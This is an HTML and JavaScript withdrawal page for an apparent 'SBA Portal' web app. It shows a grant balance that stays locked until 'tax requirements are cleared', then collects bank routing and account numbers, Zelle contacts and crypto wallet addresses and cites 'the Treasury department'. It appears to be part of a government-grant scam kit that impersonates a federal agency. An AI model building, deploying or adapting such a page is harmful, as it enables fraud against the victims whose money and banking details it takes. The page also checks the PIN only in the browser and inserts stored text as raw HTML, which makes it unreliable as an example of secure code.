<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Withdraw Funds | SBA Portal</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="stylesheet" href="global.css">
    <style>
        .method-tabs { display: flex; gap: 8px; margin-bottom: 24px; background: var(--surface-2); padding: 4px; border-radius: var(--r-md); }
        .method-tab { flex: 1; padding: 10px; border: none; background: none; border-radius: var(--r-sm); font-size: 0.85rem; font-weight: 700; color: var(--text-muted); cursor: pointer; transition: var(--t-fast); font-family: var(--font); }
        .method-tab.active { background: var(--white); color: var(--navy); box-shadow: var(--shadow-sm); }
        .withdraw-pane { display: none; animation: fadeSlide 0.3s ease; }
        .withdraw-pane.active { display: block; }
    </style>
</head>
<body>
    <div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>

    <div class="app-layout">
        <aside class="app-sidebar" id="appSidebar"></aside>
        <div class="app-sidebar__overlay" id="sidebarOverlay"></div>

        <main class="app-main">
            <header class="page-header" id="pageHeader"></header>

            <div class="app-main__content" style="max-width: 600px;">
                <div id="withdrawTarget"></div>
            </div>
        </main>
    </div>

    <script type="module">
        import { db, serverTimestamp, updateUserData, addLedgerEntry, notify, notifyAdmins } from './firebase-config.js';
        import { requireAuth, buildSidebar, buildPageHeader, initTheme, initNotificationBadge, setButtonLoading, showToast, formatCurrency, showConfirm } from './app.js';

        requireAuth((user, userData) => {
            initTheme();
            buildSidebar({ activeId: 'withdraw', userData });
            buildPageHeader({ title: 'Withdraw Funds', subtitle: 'Secure Federal Disbursement', backUrl: 'dashboard.html' });
            initNotificationBadge(user.uid);

            const target = document.getElementById('withdrawTarget');

            if (userData.awardStatus !== 'APPROVED') {
                target.innerHTML = `
                    <div class="status-screen card">
                        <div class="status-screen__icon status-screen__icon--info"><i class="fa-solid fa-lock"></i></div>
                        <h2 class="status-screen__title">Step Locked</h2>
                        <p class="status-screen__message">Withdrawal is only enabled once your Grant Award has been officially issued and tax requirements are cleared.</p>
                        <a href="dashboard.html" class="btn btn--secondary">Back to Dashboard</a>
                    </div>
                `;
                return;
            }

            if (userData.withdrawStatus === 'PENDING') {
                target.innerHTML = `
                    <div class="status-screen card">
                        <div class="status-screen__icon status-screen__icon--pending"><i class="fa-solid fa-money-bill-transfer"></i></div>
                        <h2 class="status-screen__title">Transfer Pending</h2>
                        <p class="status-screen__message">Your withdrawal request for ${formatCurrency(userData.withdrawal?.amount || 0)} is being processed by the Treasury department. Expected completion: 1-3 business days.</p>
                    </div>
                `;
            } else if (userData.withdrawStatus === 'REJECTED') {
                target.innerHTML = `
                    <div class="status-screen card">
                        <div class="status-screen__icon status-screen__icon--error"><i class="fa-solid fa-triangle-exclamation"></i></div>
                        <h2 class="status-screen__title">Request Declined</h2>
                        <p class="status-screen__message">Reason: ${userData.withdrawal?.declineReason || 'Invalid details.'}</p>
                        <button class="btn btn--primary" id="btnRetryWithdraw">Submit New Request</button>
                    </div>
                `;
                document.getElementById('btnRetryWithdraw').onclick = async () => {
                    await updateUserData(user.uid, { withdrawStatus: 'IDLE' });
                    window.location.reload();
                };
            } else {
                renderWithdrawForm(user, userData, target);
            }
        });

        function renderWithdrawForm(user, userData, target) {
            target.innerHTML = `
                <div class="card">
                    <div style="background:var(--navy); color:white; padding:24px; border-radius:var(--r-lg); margin-bottom:28px; text-align:center;">
                        <div style="font-size:0.75rem; opacity:0.8; text-transform:uppercase; font-weight:700; margin-bottom:4px;">Available for Withdrawal</div>
                        <div style="font-size:2.2rem; font-weight:900;">${formatCurrency(userData.balance)}</div>
                    </div>

                    <div class="method-tabs">
                        <button class="method-tab active" data-target="bank">Bank Wire</button>
                        <button class="method-tab" data-target="zelle">Zelle</button>
                        <button class="method-tab" data-target="crypto">Crypto</button>
                    </div>

                    <form id="withdrawForm">
                        <div id="pane-bank" class="withdraw-pane active">
                            <div class="form-group"><label class="form-label">Bank Name</label><input type="text" id="w-bankName" class="form-input" placeholder="e.g. Chase Bank"></div>
                            <div class="form-group"><label class="form-label">Routing Number</label><input type="text" id="w-routing" class="form-input" maxlength="9" placeholder="9-digit code"></div>
                            <div class="form-group"><label class="form-label">Account Number</label><input type="text" id="w-account" class="form-input"></div>
                            <div class="form-group"><label class="form-label">Account Type</label><select id="w-type" class="form-select"><option>Checking</option><option>Savings</option></select></div>
                        </div>

                        <div id="pane-zelle" class="withdraw-pane">
                            <div class="form-group"><label class="form-label">Zelle Contact (Email/Phone)</label><input type="text" id="w-zelle" class="form-input" placeholder="name@email.com"></div>
                        </div>

                        <div id="pane-crypto" class="withdraw-pane">
                            <div class="form-group"><label class="form-label">Select Coin</label><select id="w-coin" class="form-select"><option>USDT (TRC20)</option><option>Bitcoin</option><option>Ethereum</option></select></div>
                            <div class="form-group"><label class="form-label">Your Wallet Address</label><input type="text" id="w-cryptoAddress" class="form-input" placeholder="Paste address carefully"></div>
                        </div>

                        <hr style="margin:24px 0; border:none; border-top:1px solid var(--border-light);">

                        <div class="form-group">
                            <label class="form-label">Withdrawal Amount (USD)</label>
                            <input type="number" id="w-amount" class="form-input" max="${userData.balance}" placeholder="0.00">
                        </div>

                        <div class="form-group">
                            <label class="form-label">Transaction PIN</label>
                            <input type="password" id="w-pin" class="form-input" maxlength="4" placeholder="••••">
                        </div>

                        <button type="submit" class="btn btn--primary btn--full btn--lg mt-4" id="btnSubmitWithdraw">Submit Withdrawal Request</button>
                    </form>
                </div>
            `;

            // Tab logic
            let currentMethod = 'bank';
            document.querySelectorAll('.method-tab').forEach(tab => {
                tab.onclick = () => {
                    document.querySelectorAll('.method-tab').forEach(t => t.classList.remove('active'));
                    document.querySelectorAll('.withdraw-pane').forEach(p => p.classList.remove('active'));
                    tab.classList.add('active');
                    currentMethod = tab.dataset.target;
                    document.getElementById(`pane-${currentMethod}`).classList.add('active');
                };
            });

            document.getElementById('withdrawForm').onsubmit = async (e) => {
                e.preventDefault();
                const amount = parseFloat(document.getElementById('w-amount').value);
                const pin = document.getElementById('w-pin').value;

                if (!amount || amount <= 0) return showToast('Enter valid amount', 'warning');
                if (amount > userData.balance) return showToast('Insufficient balance', 'error');
                if (pin !== userData.transactionPin) return showToast('Invalid Transaction PIN', 'error');

                showConfirm({
                    title: 'Confirm Withdrawal',
                    message: `You are requesting to withdraw ${formatCurrency(amount)} via ${currentMethod.toUpperCase()}. This process is irreversible once approved.`,
                    danger: true,
                    confirmText: 'Submit Request',
                    onConfirm: async () => {
                        const btn = document.getElementById('btnSubmitWithdraw');
                        setButtonLoading(btn, true);

                        const withdrawalData = {
                            method: currentMethod,
                            amount: amount,
                            submittedAt: serverTimestamp(),
                            // Gather all potentially filled fields
                            bankName: document.getElementById('w-bankName').value,
                            routingNumber: document.getElementById('w-routing').value,
                            accountNumber: document.getElementById('w-account').value,
                            accountType: document.getElementById('w-type').value,
                            zelleContact: document.getElementById('w-zelle').value,
                            cryptoCoin: document.getElementById('w-coin').value,
                            cryptoAddress: document.getElementById('w-cryptoAddress').value
                        };

                        try {
                            await updateUserData(user.uid, {
                                balance: userData.balance - amount,
                                withdrawStatus: 'PENDING',
                                withdrawal: withdrawalData
                            });
                            await addLedgerEntry(user.uid, {
                                type: 'withdrawal',
                                amount: amount,
                                description: `Withdrawal Requested (${currentMethod})`,
                                status: 'PENDING'
                            });
                            await notify(user.uid, {
                                title: 'Withdrawal Requested',
                                message: `Your request for ${formatCurrency(amount)} is under review.`,
                                type: 'info',
                                sendEmail: true
                            });
                            await notifyAdmins({
                                title: 'New Withdrawal',
                                message: `${userData.fullName} requested ${formatCurrency(amount)} via ${currentMethod}`,
                                type: 'action'
                            });
                            showToast('Request submitted', 'success');
                            window.location.reload();
                        } catch (err) {
                            setButtonLoading(btn, false);
                            showToast('Request failed', 'error');
                        }
                    }
                });
            };
        }
    </script>
</body>
</html>
